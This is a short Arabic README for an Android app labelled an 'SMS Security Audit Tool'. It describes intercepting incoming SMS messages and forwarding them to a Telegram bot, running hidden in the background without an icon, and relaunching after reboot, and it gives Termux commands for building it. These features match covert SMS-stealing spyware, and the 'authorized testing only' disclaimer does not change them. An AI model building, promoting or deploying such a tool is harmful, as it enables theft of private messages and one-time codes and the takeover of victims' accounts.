# SMS Security Audit Tool

أداة لاعتراض رسائل SMS وإرسالها إلى بوت Telegram.

## ⚠️ تحذير

للاختبار المصرح به فقط. الاستخدام بدون إذن غير قانوني.

## الميزات

- اعتراض رسائل SMS الواردة
- إرسالها إلى بوت Telegram
- العمل في الخلفية بدون أيقونة
- تشغيل تلقائي بعد إعادة الإقلاع

## البناء (Termux)

```bash
pkg update -y && pkg upgrade -y
pkg install openjdk-17 aapt apksigner dx ecj wget -y
chmod +x build.sh
./build.sh
